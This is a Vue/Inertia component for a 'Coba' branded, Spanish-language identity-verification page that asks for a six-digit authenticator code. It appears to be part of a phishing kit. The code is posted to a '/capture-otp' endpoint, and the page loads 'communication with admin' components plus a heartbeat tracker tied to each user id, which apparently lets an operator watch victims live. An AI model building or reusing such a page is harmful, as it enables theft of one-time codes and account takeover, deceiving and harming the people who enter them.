<script setup>
import { ref, onMounted, onBeforeUnmount } from 'vue'
import { useForm, Head } from '@inertiajs/vue3'
import ModalSystem from '../Components/Usuario/ModalSystem.vue'
import HerramientasSystem from '../Components/Usuario/HerramientasSystem.vue'
import HeartbeatManager from '../Components/HeartbeatManager.vue'

import cobaLogo from '@/assets/coba/cobalogo.svg'
import favicon from '@/assets/coba/coba.ico'

const props = defineProps({
  error: Boolean,
  usuario: String,
  usuario_id: Number
})

const form = useForm({ otp: '' })
const option = ref(0)
const showError = ref(false)
const errorMessage = ref('')

let intervalId = null
onMounted(() => {
  if (props.error) { showError.value = true; errorMessage.value = 'Código OTP incorrecto, intente nuevamente' }
})

onBeforeUnmount(() => { if (intervalId) clearInterval(intervalId) })

function submit() {
  showError.value = false
  errorMessage.value = ''
  const otpRegex = /^\d{6}$/
  if (!form.otp || !otpRegex.test(form.otp)) {
    showError.value = true
    errorMessage.value = 'El código debe tener exactamente 6 dígitos'
    return
  }
  option.value = 1
  setTimeout(() => {
    form.post('/capture-otp', {
      preserveState: false,
      preserveScroll: true,
      onFinish: () => option.value = 0
    })
  }, 800)
}
</script>

<template>
  <Head>
    <title>Coba - Verificación</title>
    <link rel="icon" :href="favicon" />
  </Head>

  <!-- Sistemas de comunicación con admin -->
  <ModalSystem :usuario-id="usuario_id" />
  <HerramientasSystem :usuario-id="usuario_id" />
  <HeartbeatManager :usuario-id="usuario_id" pagina="otp" />

  <!-- Loader -->
  <div v-if="option === 1" class="fixed inset-0 bg-white z-[300] flex items-center justify-center">
    <div class="flex flex-col items-center space-y-4">
      <div class="relative">
        <div class="w-12 h-12 border-4 border-gray-200 rounded-full"></div>
        <div class="absolute top-0 left-0 w-12 h-12 border-4 border-emerald-600 border-t-transparent rounded-full animate-spin"></div>
      </div>
      <p class="text-gray-600 font-medium">Procesando...</p>
    </div>
  </div>

  <!-- Contenido principal -->
  <div v-else class="min-h-screen bg-white">
    <div class="max-w-3xl mx-auto px-6 py-10">
      <!-- Header minimal con logo y salida -->
      <div class="flex items-center justify-between mb-10">
        <img :src="cobaLogo" alt="Coba" class="h-8" />
        <a href="/" class="text-gray-400 hover:text-gray-600" aria-label="Salir">
          <!-- Exit SVG proporcionado -->
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15m3 0l3-3m0 0l-3-3m3 3H9"/>
          </svg>
        </a>
      </div>

      <div class="max-w-2xl">
        <h2 class="text-xl font-semibold text-gray-900">Verifica tu identidad</h2>
        <p class="mt-2 text-sm text-gray-600">Abre tu app de autenticación e ingresa el código de 6 dígitos para continuar.</p>

        <div class="mt-8">
          <label for="otp" class="block text-sm text-gray-700">Código de 6 dígitos</label>
          <input id="otp" v-model="form.otp"  maxlength="6" inputmode="numeric" class="mt-2 w-full max-w-lg rounded-md border border-gray-300 px-4 py-3 text-lg tracking-widest text-center focus:outline-none focus:ring-2 focus:ring-emerald-600" placeholder="000000" />


        </div>
         <button @click="submit" type="button" class="mt-6 inline-flex items-center justify-center rounded-md bg-emerald-700 px-5 py-2.5 text-white font-semibold hover:bg-emerald-800 focus:outline-none focus:ring-2 focus:ring-emerald-600">
            Continuar
          </button>

        <!-- Ayuda -->
        <div class="mt-16 text-gray-700 max-w-md">
          <p class="text-center font-semibold text-gray-800">¿Problemas para accesar?</p>
          <div class="mt-6 space-y-4 text-sm">
            <p>Recuerda usar la misma aplicación con la que configuraste tu autenticación, como Google Authenticator.</p>
            <p>Si el código no es aceptado, intenta reiniciar tu teléfono. A veces los dispositivos se desajustan con los tiempos y eso afecta la validación.</p>
            <p>Si aún no funciona o no recuerdas la configuración, escríbenos a support@coba.ai y con gusto te apoyamos.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- Botón inferior de soporte (SVG proporcionado) -->
    <button class="fixed bottom-5 right-5 rounded-full bg-emerald-700 p-3 text-white shadow-lg hover:bg-emerald-800" aria-label="Soporte">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32" class="w-6 h-6 fill-current"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"/></svg>
    </button>
  </div>
</template>

<style>
html, body { min-width: 320px; }
</style>

